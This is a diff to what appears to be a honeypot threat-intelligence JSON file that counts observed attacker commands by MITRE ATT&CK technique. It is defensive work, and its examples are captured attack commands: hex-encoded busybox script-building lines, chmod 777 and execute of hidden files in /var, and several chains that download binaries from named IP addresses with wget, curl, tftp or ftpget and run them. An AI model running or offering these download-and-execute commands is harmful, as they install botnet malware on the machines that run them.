@@ -10,11 +10,11 @@
       "count": 130115,
       "distinct_ips": 410,
       "examples": [
-        "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
-        "/bin/busybox echo -ne \"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7D\\x0A\\x0A\" >> .k",
-        "/bin/busybox echo -ne \"\\x20\\x20\\x20\\x20\\x72\\x65\\x73\\x75\\x6C\\x74\\x3D\\x24\\x28\\x6C\\x73\\x20\\x2D\\x6C\\x20\\x22\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x65\" >> .k",
-        "/bin/busybox echo -ne \"\\x78\\x65\\x22\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x75\\x6C\\x6C\\x29\\x0A\\x0A\\x20\\x20\\x20\\x20\\x69\\x66\\x20\\x5B\\x20\\x22\\x24\\x72\\x65\" >> .k",
-        "/bin/busybox echo -ne \"\\x73\\x75\\x6C\\x74\\x22\\x20\\x21\\x3D\\x20\\x22\\x24\\x7B\\x72\\x65\\x73\\x75\\x6C\\x74\\x25\\x28\\x64\\x65\\x6C\\x65\\x74\\x65\\x64\\x29\\x7D\\x22\\x20\\x5D\" >> .k"
+        "echo -e \"\\x6F\\x6B\"",
+        "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+        "echo -e \"\\x47\\x41\\x59\"",
+        "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
+        "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
       ]
     },
     {
@@ -24,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 17176,
-      "distinct_ips": 663,
+      "count": 17200,
+      "distinct_ips": 665,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/; ",
@@ -44,11 +44,11 @@
       "count": 2915,
       "distinct_ips": 440,
       "examples": [
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; busybox curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; tftp 176.65.139.157 -c get telnet2.sh; tftp -r telnet2.sh -g 176.65.139.157; ftpget -v -u anonymous -p anonymous -P 21 176.65.139.157 telnet2.sh telnet2.sh; chmod 777 telnet2.sh; sh telnet2.sh; rm -rf telnet2.sh",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64"
       ]
     },
     {
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 415325,
-  "matched_commands": 148306
+  "total_commands": 415383,
+  "matched_commands": 148330
 }
